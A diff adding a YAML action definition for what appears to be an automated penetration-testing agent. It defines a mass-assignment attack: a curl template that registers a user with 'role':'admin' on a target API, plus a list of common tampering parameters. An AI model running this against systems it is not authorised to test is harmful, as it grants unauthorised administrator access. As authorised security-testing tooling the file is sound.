@@ -1,0 +1,16 @@
+name: mass_assignment
+category: web
+description: Mass assignment / parameter tampering
+preconditions:
+  - service.port==80
+parameters:
+  target_ip: from_engagement.target_ip
+command_template: "curl -s -X POST '{target_url}/api/register' -H 'Content-Type: application/json' -d '{{"username":"test","password":"test","role":"admin"}}'"
+parser: null
+expected_effects:
+  - action_completed
+falsifier:
+  pattern: "error|failed|refused|denied"
+  timeout: 30
+model_tier: haiku
+mechanism: "Add unexpected parameters to requests. Common: role=admin, isAdmin=true, verified=true, balance=99999. Frameworks: Rails strong_params, Django forms, Express body."
